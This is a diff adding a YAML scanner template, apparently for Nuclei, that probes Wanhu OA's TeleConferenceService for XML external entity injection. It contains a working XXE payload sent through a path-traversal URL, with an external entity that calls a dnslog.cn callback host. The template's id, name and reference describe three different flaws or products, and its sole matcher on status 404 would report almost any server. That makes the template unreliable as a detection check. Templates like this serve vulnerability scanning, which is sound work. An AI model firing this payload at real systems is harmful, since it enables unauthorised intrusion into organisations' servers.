@@ -1,0 +1,31 @@
+id: wanhuoa_fileUploadController
+time: '2021-04-08'
+
+
+info:
+  name: Seeyon Unauthoried Access
+  author: pikpikcu
+  reference: https://peiqi.wgpsec.org/wiki/oa/%E4%B8%87%E6%88%B7OA/%E4%B8%87%E6%88%B7OA%20TeleConferenceService%20XXE%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
+  severity: high
+  
+http:
+  - method: 
+      - POST
+    path:
+      - "{{BaseURL}}/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../TeleConferenceService"
+    body:
+      - |
+        <?xml version="1.0" encoding="UTF-8" ?>
+        <!DOCTYPE ANY [
+        <!ENTITY xxe SYSTEM "http://zmh7pg.dnslog.cn" >]>        
+        <value>&xxe;</value>
+
+      
+
+    matchers-condition: and
+    matchers:
+
+      - type: status
+        status:
+          - 404
+    
